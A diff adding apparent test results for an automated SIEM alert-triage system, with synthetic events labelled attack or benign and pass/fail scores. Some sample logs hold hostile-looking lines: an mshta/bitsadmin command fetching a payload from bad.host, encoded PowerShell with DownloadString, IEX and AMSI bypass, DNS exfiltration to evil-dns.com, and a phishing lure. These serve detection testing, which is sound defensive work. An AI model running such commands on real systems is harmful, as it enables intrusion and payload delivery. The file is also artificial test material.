@@ -1,0 +1,370 @@
+[
+  {
+    "test": {
+      "name": "phishing_d888c2",
+      "task_type": "phishing",
+      "input": {
+        "prompt": "AutoResearch test: 'phishing' inconsistent scoring (stddev=32.2)",
+        "severity": "high",
+        "siem_event": {
+          "source_ip": "203.0.113.57",
+          "rule_name": "Phishing URL",
+          "raw_log": "URGENT verify your account immediately or suspended. Click here: https://login-verify-portal.com/auth/login.php password credential From: alert@amaz0n-security.com",
+          "title": "Phishing URL"
+        }
+      },
+      "expect": "attack",
+      "min_risk": 65,
+      "weakness_ref": "'phishing' inconsistent scoring (stddev=32.2)"
+    },
+    "task_id": "4109e875-e1a4-403d-a644-f4277a5e6f37",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "true_positive",
+    "risk_score": 100,
+    "path_taken": "?",
+    "passed": true
+  },
+  {
+    "test": {
+      "name": "kerberoasting_2918ca",
+      "task_type": "kerberoasting",
+      "input": {
+        "prompt": "AutoResearch test: 'kerberoasting' inconsistent scoring (stddev=26.7)",
+        "severity": "high",
+        "siem_event": {
+          "source_ip": "10.0.20.81",
+          "rule_name": "Kerberoasting",
+          "raw_log": "EventID=4769 TicketEncryptionType=0x17 ServiceName=MSSQLSvc/db01:1433 TargetUserName=attacker ClientAddress=10.0.20.81",
+          "title": "Kerberoasting"
+        }
+      },
+      "expect": "attack",
+      "min_risk": 65,
+      "weakness_ref": "'kerberoasting' inconsistent scoring (stddev=26.7)"
+    },
+    "task_id": "c0bce178-c8d7-4d14-9c8b-6d56ece6ad0e",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "true_positive",
+    "risk_score": 80,
+    "path_taken": "?",
+    "passed": true
+  },
+  {
+    "test": {
+      "name": "dns_exfiltration_ff93b8",
+      "task_type": "dns_exfiltration",
+      "input": {
+        "prompt": "AutoResearch test: 'dns_exfiltration' inconsistent scoring (stddev=24.5)",
+        "severity": "high",
+        "siem_event": {
+          "source_ip": "10.0.30.228",
+          "domain": "aGVsbG8gZXhmaWx0cmF0aW9u.evil-dns.com",
+          "rule_name": "DNS Exfiltration",
+          "raw_log": "DNS TXT query: aGVsbG8gZXhmaWx0cmF0aW9u.evil-dns.com type=TXT queries=200 dns exfiltration high entropy tunnel nslookup 10.0.30.228",
+          "title": "DNS Exfiltration"
+        }
+      },
+      "expect": "attack",
+      "min_risk": 65,
+      "weakness_ref": "'dns_exfiltration' inconsistent scoring (stddev=24.5)"
+    },
+    "task_id": "5682974f-e42d-4265-8704-8bc360100c8f",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "true_positive",
+    "risk_score": 100,
+    "path_taken": "?",
+    "passed": true
+  },
+  {
+    "test": {
+      "name": "generic_user_login",
+      "task_type": "user_login",
+      "input": {
+        "prompt": "Generic test: user_login",
+        "severity": "high",
+        "siem_event": {
+          "title": "Test: user_login",
+          "source_ip": "10.0.1.7",
+          "rule_name": "AutoTest-user_login",
+          "raw_log": "Auto-generated for user_login from 10.0.1.7 suspicious activity"
+        }
+      },
+      "expect": "attack",
+      "min_risk": 50,
+      "weakness_ref": "'user_login': only 0.0% have MITRE mappings"
+    },
+    "task_id": "118251fb-77e8-4d71-8e18-58fc4d603251",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "benign",
+    "risk_score": 0,
+    "path_taken": "?",
+    "passed": false
+  },
+  {
+    "test": {
+      "name": "dns_exfiltration_d42295",
+      "task_type": "dns_exfiltration",
+      "input": {
+        "prompt": "AutoResearch test: 'dns_exfiltration': only 0.0% have MITRE mappings",
+        "severity": "high",
+        "siem_event": {
+          "source_ip": "10.0.30.211",
+          "domain": "aGVsbG8gZXhmaWx0cmF0aW9u.evil-dns.com",
+          "rule_name": "DNS Exfiltration",
+          "raw_log": "DNS TXT query: aGVsbG8gZXhmaWx0cmF0aW9u.evil-dns.com type=TXT queries=200 dns exfiltration high entropy tunnel nslookup 10.0.30.211",
+          "title": "DNS Exfiltration"
+        }
+      },
+      "expect": "attack",
+      "min_risk": 65,
+      "weakness_ref": "'dns_exfiltration': only 0.0% have MITRE mappings"
+    },
+    "task_id": "2d5acd8c-1126-4fa4-81e6-0b948b38a272",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "true_positive",
+    "risk_score": 100,
+    "path_taken": "?",
+    "passed": true
+  },
+  {
+    "test": {
+      "name": "golden_ticket_d30c9b",
+      "task_type": "golden_ticket",
+      "input": {
+        "prompt": "AutoResearch test: 'golden_ticket': only 0.0% have MITRE mappings",
+        "severity": "critical",
+        "siem_event": {
+          "source_ip": "10.0.20.116",
+          "rule_name": "Golden Ticket",
+          "raw_log": "EventID=4768 TicketEncryptionType=0x17 ServiceName=krbtgt Lifetime=8760h TicketOptions=0x50800000 ClientAddress=10.0.20.116",
+          "title": "Golden Ticket"
+        }
+      },
+      "expect": "attack",
+      "min_risk": 65,
+      "weakness_ref": "'golden_ticket': only 0.0% have MITRE mappings"
+    },
+    "task_id": "5a530233-d6e6-4dfa-be39-9d651c9fdaed",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "true_positive",
+    "risk_score": 100,
+    "path_taken": "?",
+    "passed": true
+  },
+  {
+    "test": {
+      "name": "generic_health_check",
+      "task_type": "health_check",
+      "input": {
+        "prompt": "Generic test: health_check",
+        "severity": "high",
+        "siem_event": {
+          "title": "Test: health_check",
+          "source_ip": "10.0.1.203",
+          "rule_name": "AutoTest-health_check",
+          "raw_log": "Auto-generated for health_check from 10.0.1.203 suspicious activity"
+        }
+      },
+      "expect": "attack",
+      "min_risk": 50,
+      "weakness_ref": "'health_check': only 0.0% have MITRE mappings"
+    },
+    "task_id": "a39410da-5ba2-43e0-8d8c-43a060e70397",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "benign",
+    "risk_score": 0,
+    "path_taken": "?",
+    "passed": false
+  },
+  {
+    "test": {
+      "name": "lolbin_abuse_ca0433",
+      "task_type": "lolbin_abuse",
+      "input": {
+        "prompt": "AutoResearch test: 'lolbin_abuse': only 0.0% have MITRE mappings",
+        "severity": "high",
+        "siem_event": {
+          "source_ip": "10.0.60.78",
+          "hostname": "WS-78",
+          "rule_name": "LOLBin Abuse",
+          "raw_log": "mshta.exe vbscript:Execute(CreateObject(Wscript.Shell).Run(malicious)) bitsadmin transfer download http://bad.host/stage2.bin",
+          "title": "LOLBin Abuse"
+        }
+      },
+      "expect": "attack",
+      "min_risk": 65,
+      "weakness_ref": "'lolbin_abuse': only 0.0% have MITRE mappings"
+    },
+    "task_id": "c2574d52-827a-4226-8369-23bd05c4ee43",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "true_positive",
+    "risk_score": 85,
+    "path_taken": "?",
+    "passed": true
+  },
+  {
+    "test": {
+      "name": "powershell_obfuscation_5aabe7",
+      "task_type": "powershell_obfuscation",
+      "input": {
+        "prompt": "AutoResearch test: 'powershell_obfuscation': only 0.0% have MITRE mappings",
+        "severity": "high",
+        "siem_event": {
+          "source_ip": "10.0.1.149",
+          "hostname": "WS-149",
+          "rule_name": "Obfuscated PowerShell",
+          "raw_log": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA -nop -w hidden DownloadString IEX Invoke-Expression bypass amsi ScriptBlock",
+          "title": "Obfuscated PowerShell"
+        }
+      },
+      "expect": "attack",
+      "min_risk": 65,
+      "weakness_ref": "'powershell_obfuscation': only 0.0% have MITRE mappings"
+    },
+    "task_id": "d9cb7501-78c0-4a6c-836d-5edddcd4221e",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "true_positive",
+    "risk_score": 70,
+    "path_taken": "?",
+    "passed": true
+  },
+  {
+    "test": {
+      "name": "benign_password_change",
+      "task_type": "password_change",
+      "input": {
+        "prompt": "Benign baseline: password_change",
+        "severity": "info",
+        "siem_event": {
+          "title": "Password Change",
+          "rule_name": "password_change",
+          "raw_log": "User jdoe changed password successfully via self-service portal",
+          "hostname": "BASELINE-61"
+        }
+      },
+      "expect": "benign",
+      "max_risk": 25,
+      "weakness_ref": "baseline regression"
+    },
+    "task_id": "c73ce4ad-d792-492e-bc5f-a398c2f72be1",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "benign",
+    "risk_score": 0,
+    "path_taken": "?",
+    "passed": true
+  },
+  {
+    "test": {
+      "name": "benign_windows_update",
+      "task_type": "windows_update",
+      "input": {
+        "prompt": "Benign baseline: windows_update",
+        "severity": "info",
+        "siem_event": {
+          "title": "Windows Update",
+          "rule_name": "windows_update",
+          "raw_log": "Windows Update KB5034441 installed successfully on WORKSTATION-01",
+          "hostname": "BASELINE-94"
+        }
+      },
+      "expect": "benign",
+      "max_risk": 25,
+      "weakness_ref": "baseline regression"
+    },
+    "task_id": "e8b3b3b2-f8b7-447a-b572-dd5caaccc7c0",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "benign",
+    "risk_score": 0,
+    "path_taken": "?",
+    "passed": true
+  },
+  {
+    "test": {
+      "name": "benign_health_check",
+      "task_type": "health_check",
+      "input": {
+        "prompt": "Benign baseline: health_check",
+        "severity": "info",
+        "siem_event": {
+          "title": "Health Check",
+          "rule_name": "health_check",
+          "raw_log": "System health check passed. CPU 45 percent Memory 62 percent. All services normal.",
+          "hostname": "BASELINE-37"
+        }
+      },
+      "expect": "benign",
+      "max_risk": 25,
+      "weakness_ref": "baseline regression"
+    },
+    "task_id": "982dbf0e-d666-4299-9fde-21b6f59140b8",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "benign",
+    "risk_score": 0,
+    "path_taken": "?",
+    "passed": true
+  },
+  {
+    "test": {
+      "name": "benign_scheduled_backup",
+      "task_type": "scheduled_backup",
+      "input": {
+        "prompt": "Benign baseline: scheduled_backup",
+        "severity": "info",
+        "siem_event": {
+          "title": "Scheduled Backup",
+          "rule_name": "scheduled_backup",
+          "raw_log": "Nightly backup completed successfully. 150 GB backed up.",
+          "hostname": "BASELINE-94"
+        }
+      },
+      "expect": "benign",
+      "max_risk": 25,
+      "weakness_ref": "baseline regression"
+    },
+    "task_id": "e26addaa-0ded-4091-9ff2-946be0b9504c",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "benign",
+    "risk_score": 0,
+    "path_taken": "?",
+    "passed": true
+  },
+  {
+    "test": {
+      "name": "benign_user_login",
+      "task_type": "user_login",
+      "input": {
+        "prompt": "Benign baseline: user_login",
+        "severity": "info",
+        "siem_event": {
+          "title": "User Login",
+          "rule_name": "user_login",
+          "raw_log": "User asmith logged in via RDP from 10.0.1.150 at 09:00 UTC",
+          "hostname": "BASELINE-88"
+        }
+      },
+      "expect": "benign",
+      "max_risk": 25,
+      "weakness_ref": "baseline regression"
+    },
+    "task_id": "01ee983a-54b1-4f68-988a-9e3b49477202",
+    "submitted": true,
+    "status": "completed",
+    "verdict": "benign",
+    "risk_score": 0,
+    "path_taken": "?",
+    "passed": true
+  }
+]
